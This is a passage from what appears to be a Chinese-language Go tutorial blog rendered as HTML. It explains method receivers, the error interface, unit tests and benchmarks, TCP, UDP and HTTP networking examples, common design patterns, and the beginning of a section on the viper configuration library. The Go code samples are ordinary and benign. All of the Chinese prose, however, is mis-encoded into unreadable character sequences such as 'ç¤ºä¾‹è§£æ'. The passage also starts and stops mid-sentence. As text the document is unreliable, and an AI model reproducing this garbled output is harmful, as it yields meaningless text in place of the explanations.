ç±»å‹çš„å˜é‡ä¸Šè¢«è°ƒç”¨ï¼Œå¹¶ä¸”åœ¨å‡½æ•°å†…éƒ¨å¯ä»¥è®¿é—®æ¥æ”¶è€…ï¼ˆ<code>r</code>ï¼‰çš„å­—æ®µã€‚</p><h3 id="ç¤ºä¾‹è§£æ"><a href="#ç¤ºä¾‹è§£æ" class="headerlink" title="ç¤ºä¾‹è§£æ"></a>ç¤ºä¾‹è§£æ</h3><p>è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length, Width <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Length * r.Width</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼š</p><ul><li><code>Rectangle</code> æ˜¯ä¸€ä¸ªç»“æ„ä½“ç±»å‹ï¼Œæœ‰ä¸¤ä¸ªå­—æ®µï¼š<code>Length</code> å’Œ <code>Width</code>ã€‚</li><li><code>func (r Rectangle) Area() float64</code> å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³• <code>Area</code>ï¼Œå®ƒè®¡ç®—çŸ©å½¢çš„é¢ç§¯ã€‚<ul><li><code>(r Rectangle)</code> æ˜¯æ–¹æ³•æ¥æ”¶è€…ï¼Œæ„å‘³ç€ <code>Area</code> æ–¹æ³•ä¸ <code>Rectangle</code> ç±»å‹ç›¸å…³è”ã€‚</li><li>åœ¨ <code>Area</code> æ–¹æ³•ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>r</code> æ¥è®¿é—® <code>Rectangle</code> å®ä¾‹çš„å­—æ®µï¼ˆ<code>Length</code> å’Œ <code>Width</code>ï¼‰ã€‚</li></ul></li></ul><h3 id="è°ƒç”¨æ–¹å¼"><a href="#è°ƒç”¨æ–¹å¼" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h3><p>è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½ éœ€è¦ä¸€ä¸ª <code>Rectangle</code> ç±»å‹çš„å®ä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">rect := Rectangle&#123;Length: <span class="number">10</span>, Width: <span class="number">5</span>&#125;</span><br><span class="line">area := rect.Area() <span class="comment">// è°ƒç”¨ Area æ–¹æ³•</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>rect.Area()</code> è°ƒç”¨ä¼šå°† <code>rect</code> ä½œä¸ºæ¥æ”¶è€…ä¼ é€’ç»™ <code>Area</code> æ–¹æ³•ã€‚</p><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ–¹æ³•æ¥æ”¶è€…ä½¿å¾— Go è¯­è¨€èƒ½å¤Ÿåœ¨ç»“æ„ä½“ç±»å‹ä¸Šå®šä¹‰æ–¹æ³•ï¼Œä»è€Œå®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€äº›ç‰¹æ€§ã€‚è¿™ç§æ–¹å¼æä¾›äº†æ•°æ®å’Œæ“ä½œè¿™äº›æ•°æ®çš„æ–¹æ³•ä¹‹é—´çš„å…³è”ï¼Œç±»ä¼¼äºå…¶ä»–è¯­è¨€ä¸­çš„ç±»æ–¹æ³•ï¼Œä½†åœ¨ Go ä¸­ä»¥ä¸€ç§æ›´ç®€å•å’Œæ›´çµæ´»çš„æ–¹å¼å®ç°ã€‚</p><p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥æ·±å…¥ç†è§£ Go è¯­è¨€ä¸­çš„ <code>error</code> æ¥å£ã€å•å…ƒæµ‹è¯•å’ŒåŸºå‡†æµ‹è¯•ã€‚è¿™ä¸‰ä¸ªæ¦‚å¿µå¯¹äºç¼–å†™å¯é å’Œé«˜æ€§èƒ½çš„ Go ç¨‹åºè‡³å…³é‡è¦ã€‚</p><h1 id="é”™è¯¯å¤„ç†å’Œæµ‹è¯•"><a href="#é”™è¯¯å¤„ç†å’Œæµ‹è¯•" class="headerlink" title="é”™è¯¯å¤„ç†å’Œæµ‹è¯•"></a>é”™è¯¯å¤„ç†å’Œæµ‹è¯•</h1><h3 id="æ·±å…¥ç†è§£-error-æ¥å£"><a href="#æ·±å…¥ç†è§£-error-æ¥å£" class="headerlink" title="æ·±å…¥ç†è§£ error æ¥å£"></a>æ·±å…¥ç†è§£ <code>error</code> æ¥å£</h3><p>åœ¨ Go ä¸­ï¼Œ<code>error</code> æ˜¯ä¸€ä¸ªå†…ç½®çš„æ¥å£ï¼Œç”¨äºè¡¨ç¤ºé”™è¯¯æ¡ä»¶ï¼Œå…·æœ‰ä»¥ä¸‹å®šä¹‰ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»»ä½•å…·æœ‰ <code>Error() string</code> æ–¹æ³•çš„ç±»å‹éƒ½è‡ªåŠ¨å®ç°äº† <code>error</code> æ¥å£ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯ç±»å‹ã€‚</p><h4 id="è‡ªå®šä¹‰é”™è¯¯"><a href="#è‡ªå®šä¹‰é”™è¯¯" class="headerlink" title="è‡ªå®šä¹‰é”™è¯¯"></a>è‡ªå®šä¹‰é”™è¯¯</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyError <span class="keyword">struct</span> &#123;</span><br><span class="line">    Msg <span class="type">string</span></span><br><span class="line">    Code <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *MyError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;error: %s, code: %d&quot;</span>, e.Msg, e.Code)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="comment">// ä¸€äº›é€»è¾‘...</span></span><br><span class="line">    <span class="keyword">return</span> &amp;MyError&#123;<span class="string">&quot;Something went wrong&quot;</span>, <span class="number">404</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰é”™è¯¯ç±»å‹ <code>MyError</code>ï¼Œå¹¶å®ç°äº† <code>Error()</code> æ–¹æ³•ã€‚åœ¨ <code>doSomething</code> å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬è¿”å›äº†è¿™ä¸ªè‡ªå®šä¹‰é”™è¯¯ã€‚</p><h3 id="ç¼–å†™å•å…ƒæµ‹è¯•ï¼ˆtesting-åŒ…ï¼‰"><a href="#ç¼–å†™å•å…ƒæµ‹è¯•ï¼ˆtesting-åŒ…ï¼‰" class="headerlink" title="ç¼–å†™å•å…ƒæµ‹è¯•ï¼ˆtesting åŒ…ï¼‰"></a>ç¼–å†™å•å…ƒæµ‹è¯•ï¼ˆtesting åŒ…ï¼‰</h3><p>Go è¯­è¨€çš„ <code>testing</code> åŒ…æä¾›äº†ç¼–å†™å•å…ƒæµ‹è¯•çš„åŠŸèƒ½ã€‚å•å…ƒæµ‹è¯•æ˜¯éªŒè¯ä»£ç è¡Œä¸ºçš„ä¸€ç§æ–¹æ³•ã€‚</p><h4 id="åŸºæœ¬å•å…ƒæµ‹è¯•"><a href="#åŸºæœ¬å•å…ƒæµ‹è¯•" class="headerlink" title="åŸºæœ¬å•å…ƒæµ‹è¯•"></a>åŸºæœ¬å•å…ƒæµ‹è¯•</h4><p>å•å…ƒæµ‹è¯•é€šå¸¸å†™åœ¨ä¸æºä»£ç åŒä¸€ç›®å½•ä¸‹çš„ <code>_test.go</code> æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾æœ‰ä»¥ä¸‹å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å•å…ƒæµ‹è¯•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAdd</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    result := Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> result != <span class="number">3</span> &#123;</span><br><span class="line">        t.Errorf(<span class="string">&quot;Add(1, 2) = %d; want 3&quot;</span>, result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>go test</code> å‘½ä»¤è¿è¡Œæµ‹è¯•ã€‚</p><h3 id="åŸºå‡†æµ‹è¯•ï¼ˆBenchmarkï¼‰"><a href="#åŸºå‡†æµ‹è¯•ï¼ˆBenchmarkï¼‰" class="headerlink" title="åŸºå‡†æµ‹è¯•ï¼ˆBenchmarkï¼‰"></a>åŸºå‡†æµ‹è¯•ï¼ˆBenchmarkï¼‰</h3><p>åŸºå‡†æµ‹è¯•ç”¨äºæµ‹è¯•ä»£ç çš„æ€§èƒ½ã€‚åœ¨ Go ä¸­ï¼ŒåŸºå‡†æµ‹è¯•ä¹Ÿæ˜¯ç”¨ <code>testing</code> åŒ…æ¥ç¼–å†™çš„ã€‚</p><h4 id="åŸºå‡†æµ‹è¯•ç¤ºä¾‹"><a href="#åŸºå‡†æµ‹è¯•ç¤ºä¾‹" class="headerlink" title="åŸºå‡†æµ‹è¯•ç¤ºä¾‹"></a>åŸºå‡†æµ‹è¯•ç¤ºä¾‹</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkAdd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>b.N</code> æ˜¯ Go æµ‹è¯•æ¡†æ¶æä¾›çš„ï¼ŒåŸºå‡†æµ‹è¯•ä¼šè¿è¡Œå¤šæ¬¡ä»¥è·å–æ›´å‡†ç¡®çš„ç»“æœã€‚</li><li>ä½¿ç”¨ <code>go test -bench=.</code> å‘½ä»¤è¿è¡ŒåŸºå‡†æµ‹è¯•ã€‚</li></ul><h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><strong>ç†è§£ <code>error</code> æ¥å£</strong>ï¼šèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†é”™è¯¯æƒ…å†µï¼Œæ˜¯å†™å‡ºå¥å£® Go ç¨‹åºçš„å…³é”®ã€‚</li><li><strong>ç¼–å†™å•å…ƒæµ‹è¯•</strong>ï¼šæ˜¯ç¡®ä¿ä»£ç æ­£ç¡®æ€§çš„é‡è¦æ‰‹æ®µã€‚</li><li><strong>è¿›è¡ŒåŸºå‡†æµ‹è¯•</strong>ï¼šå¸®åŠ©ä½ äº†è§£ä»£ç çš„æ€§èƒ½ç‰¹å¾ï¼Œå¯¹äºä¼˜åŒ–å’Œä¿è¯ä»£ç æ€§èƒ½éå¸¸é‡è¦ã€‚</li></ul><p>é€šè¿‡æŒæ¡è¿™äº›æ¦‚å¿µå’ŒæŠ€å·§ï¼Œä½ å¯ä»¥å†™å‡ºæ›´å¯é ã€æ›´é«˜æ•ˆçš„ Go ç¨‹åºã€‚ğŸ’¡ğŸ§ªğŸ’»ğŸš€</p><p>Go è¯­è¨€åœ¨ç½‘ç»œç¼–ç¨‹æ–¹é¢è¡¨ç°éå¸¸å‡ºè‰²ï¼Œæä¾›äº†å¼ºå¤§çš„åº“æ¥æ”¯æŒå„ç§ç½‘ç»œæ“ä½œã€‚è®©æˆ‘ä»¬æ¥æ¢ç´¢ Go ä¸­çš„ç½‘ç»œç¼–ç¨‹åŸºç¡€ã€‚</p><h1 id="Go-ç½‘ç»œç¼–ç¨‹æ¦‚è§ˆ"><a href="#Go-ç½‘ç»œç¼–ç¨‹æ¦‚è§ˆ" class="headerlink" title="Go ç½‘ç»œç¼–ç¨‹æ¦‚è§ˆ"></a>Go ç½‘ç»œç¼–ç¨‹æ¦‚è§ˆ</h1><p>Go çš„ <code>net</code> åŒ…æä¾›äº†ä¸°å¯Œçš„ç½‘ç»œæ“ä½œæ¥å£ã€‚å®ƒæ”¯æŒ TCPã€UDPã€IP ç­‰å¤šç§ç½‘ç»œåè®®ï¼Œå¹¶ä¸”èƒ½å¤Ÿè½»æ¾åœ°å®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºã€‚</p><h3 id="TCP-ç¼–ç¨‹"><a href="#TCP-ç¼–ç¨‹" class="headerlink" title="TCP ç¼–ç¨‹"></a>TCP ç¼–ç¨‹</h3><p>TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ã€å¯é çš„ã€åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚é€šä¿¡åè®®ã€‚</p><h4 id="TCP-æœåŠ¡å™¨"><a href="#TCP-æœåŠ¡å™¨" class="headerlink" title="TCP æœåŠ¡å™¨"></a>TCP æœåŠ¡å™¨</h4><p>åˆ›å»ºä¸€ä¸ª TCP æœåŠ¡å™¨ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>ç›‘å¬ç«¯å£ã€‚</li><li>æ¥å—è¿æ¥è¯·æ±‚ã€‚</li><li>è¯»å–å’Œå†™å…¥æ•°æ®ã€‚</li></ol><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬ TCP ç«¯å£</span></span><br><span class="line">    ln, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> ln.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// æ¥å—è¿æ¥</span></span><br><span class="line">        conn, err := ln.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤„ç†è¿æ¥</span></span><br><span class="line">        <span class="keyword">go</span> handleConnection(conn)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    reader := bufio.NewReader(conn)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// è¯»å–æ•°æ®</span></span><br><span class="line">        msg, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;Message Received:&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘é€å“åº”</span></span><br><span class="line">        conn.Write([]<span class="type">byte</span>(<span class="string">&quot;Message received.\n&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TCP-å®¢æˆ·ç«¯"><a href="#TCP-å®¢æˆ·ç«¯" class="headerlink" title="TCP å®¢æˆ·ç«¯"></a>TCP å®¢æˆ·ç«¯</h4><p>åˆ›å»ºä¸€ä¸ª TCP å®¢æˆ·ç«¯é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>è¿æ¥åˆ°æœåŠ¡å™¨ã€‚</li><li>è¯»å–å’Œå†™å…¥æ•°æ®ã€‚</li></ol><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// è¿æ¥åˆ°æœåŠ¡å™¨</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;localhost:8080&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘é€æ•°æ®</span></span><br><span class="line">    fmt.Fprintln(conn, <span class="string">&quot;Hello, Server!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¥æ”¶å“åº”</span></span><br><span class="line">    response, err := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Print(<span class="string">&quot;Server Response:&quot;</span>, response)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UDP-ç¼–ç¨‹"><a href="#UDP-ç¼–ç¨‹" class="headerlink" title="UDP ç¼–ç¨‹"></a>UDP ç¼–ç¨‹</h3><p>UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯ä¸€ç§æ— è¿æ¥çš„ç½‘ç»œåè®®ï¼Œæä¾›äº†å¿«é€Ÿä½†ä¸å¯é çš„ä¼ è¾“æœåŠ¡ã€‚</p><h4 id="UDP-æœåŠ¡å™¨"><a href="#UDP-æœåŠ¡å™¨" class="headerlink" title="UDP æœåŠ¡å™¨"></a>UDP æœåŠ¡å™¨</h4><p>åˆ›å»ºä¸€ä¸ª UDP æœåŠ¡å™¨çš„æ­¥éª¤ï¼š</p><ol><li>ç›‘å¬ UDP ç«¯å£ã€‚</li><li>è¯»å–å’Œå†™å…¥æ•°æ®ã€‚</li></ol><h4 id="UDP-å®¢æˆ·ç«¯"><a href="#UDP-å®¢æˆ·ç«¯" class="headerlink" title="UDP å®¢æˆ·ç«¯"></a>UDP å®¢æˆ·ç«¯</h4><p>åˆ›å»ºä¸€ä¸ª UDP å®¢æˆ·ç«¯çš„æ­¥éª¤ï¼š</p><ol><li>å‘é€æ•°æ®åˆ°æœåŠ¡å™¨ã€‚</li><li>æ¥æ”¶æœåŠ¡å™¨çš„å“åº”ã€‚</li></ol><h3 id="HTTP-ç¼–ç¨‹"><a href="#HTTP-ç¼–ç¨‹" class="headerlink" title="HTTP ç¼–ç¨‹"></a>HTTP ç¼–ç¨‹</h3><p>Go çš„ <code>net/http</code> åŒ…æä¾›äº† HTTP å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„å®ç°ã€‚</p><h4 id="HTTP-æœåŠ¡å™¨"><a href="#HTTP-æœåŠ¡å™¨" class="headerlink" title="HTTP æœåŠ¡å™¨"></a>HTTP æœåŠ¡å™¨</h4><p>åˆ›å»ºä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;Hello, you&#x27;ve requested: %s\n&quot;</span>, r.URL.Path)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HTTP-å®¢æˆ·ç«¯"><a href="#HTTP-å®¢æˆ·ç«¯" class="headerlink" title="HTTP å®¢æˆ·ç«¯"></a>HTTP å®¢æˆ·ç«¯</h4><p>ä½¿ç”¨ <code>net/http</code> åŒ…åˆ›å»º HTTP å®¢æˆ·ç«¯æ¥å‘é€è¯·æ±‚ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;http://example.com/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>Go è¯­è¨€ä¸­çš„ç½‘ç»œç¼–ç¨‹éå¸¸å¼ºå¤§å’Œçµæ´»ï¼Œæ— è®ºæ˜¯ä½çº§çš„ TCP&#x2F;UDP ç¼–ç¨‹ï¼Œè¿˜æ˜¯æ›´é«˜çº§çš„ HTTP</p><p> åº”ç”¨ï¼ŒGo éƒ½æä¾›äº†ä¸°å¯Œçš„å·¥å…·å’Œåº“æ¥å®ç°å®ƒä»¬ã€‚é€šè¿‡å®è·µè¿™äº›åŸºç¡€çŸ¥è¯†ï¼Œä½ å¯ä»¥æ„å»ºå„ç§ç½‘ç»œåº”ç”¨å’ŒæœåŠ¡ã€‚ğŸ’»ğŸŒğŸš€</p><h1 id="å¸¸ç”¨è®¾è®¡æ¨¡å¼"><a href="#å¸¸ç”¨è®¾è®¡æ¨¡å¼" class="headerlink" title="å¸¸ç”¨è®¾è®¡æ¨¡å¼"></a>å¸¸ç”¨è®¾è®¡æ¨¡å¼</h1><p>åœ¨ Go ä¸­ï¼Œæœ‰ä¸€äº›å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼éå¸¸é€‚åˆå¤„ç†ç‰¹å®šçš„ç¼–ç¨‹é—®é¢˜ã€‚</p><ol><li><strong>å•ä¾‹æ¨¡å¼</strong><ul><li>ç¡®ä¿ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›å…¨å±€è®¿é—®ç‚¹ã€‚</li></ul></li><li><strong>å·¥å‚æ¨¡å¼</strong><ul><li>ç”¨ä¸€ä¸ªå·¥å‚ç±»åˆ›å»ºå¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ç›´æ¥ new å¯¹è±¡ã€‚</li></ul></li><li><strong>ç­–ç•¥æ¨¡å¼</strong><ul><li>å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä½¿å®ƒä»¬å¯ä»¥ç›¸äº’æ›¿æ¢ã€‚</li></ul></li><li><strong>è£…é¥°å™¨æ¨¡å¼</strong><ul><li>åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼Œæ¯”ç›´æ¥ä¿®æ”¹å¯¹è±¡æ›´çµæ´»ã€‚</li></ul></li><li><strong>è§‚å¯Ÿè€…æ¨¡å¼</strong><ul><li>å½“ä¸€ä¸ªå¯¹è±¡çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å°†å¾—åˆ°é€šçŸ¥ã€‚</li></ul></li><li><strong>é€‚é…å™¨æ¨¡å¼</strong><ul><li>å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ã€‚</li></ul></li></ol><h1 id="é…ç½®ç®¡ç†â€”â€”viper"><a href="#é…ç½®ç®¡ç†â€”â€”viper" class="headerlink" title="é…ç½®ç®¡ç†â€”â€”viper"></a>é…ç½®ç®¡ç†â€”â€”viper</h1><p><code>viper</code> æ˜¯ Go è¯­è¨€ä¸­éå¸¸æµè¡Œçš„é…ç½®ç®¡ç†åº“ï¼Œå®ƒè¢«å¹¿æ³›ç”¨äºå¤„ç†åº”ç”¨ç¨‹åºçš„é…ç½®éœ€æ±‚ã€‚<code>viper</code> å¼ºå¤§åœ¨äºå®ƒçš„çµæ´»æ€§å’Œæ˜“ç”¨æ€§ï¼Œæ”¯æŒå¤šç§æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆJSONã€TOMLã€YAMLã€HCL ç­‰ï¼‰ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»ç¯å¢ƒå˜é‡ã€å‘½ä»¤è¡Œå‚æ•°ã€è¿œç¨‹é…ç½®ç³»ç»Ÿï¼ˆå¦‚ etcd æˆ– Consulï¼‰ç­‰å¤šç§æ¥æºè¯»å–é…ç½®ã€‚</p><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><ol><li><strong>è®¾ç½®é»˜è®¤å€¼</strong>ï¼šä¸ºä¸åŒçš„é…ç½®é”®è®¾ç½®é»˜è®¤å€¼ã€‚</li><li><strong>è¯»å–é…ç½®</strong>ï¼šä»æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€è¿œç¨‹ç³»ç»Ÿç­‰è¯»å–é…ç½®ã€‚</li><li><strong>å®æ—¶é‡è½½</strong>ï¼šæ”¯æŒå®æ—¶ç›‘æ§é…ç½®æ–‡ä»¶çš„æ›´æ”¹å¹¶é‡æ–°åŠ è½½é…ç½®ã€‚</li><li><strong>ç±»å‹å®‰å…¨è·å–å€¼</strong>ï¼šæä¾›æ–¹æ³•å®‰å…¨åœ°è·å–é…ç½®å€¼çš„ä¸åŒç±»å‹ï¼ˆä¾‹å¦‚ <code>GetString</code>, <code>GetInt</code> ç­‰ï¼‰ã€‚</li></ol><h3 id="åŸºæœ¬ç”¨æ³•-4"><a href="#åŸºæœ¬ç”¨æ³•-4" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><ol><li><p><strong>å®‰è£…</strong></p><figure class="highlight 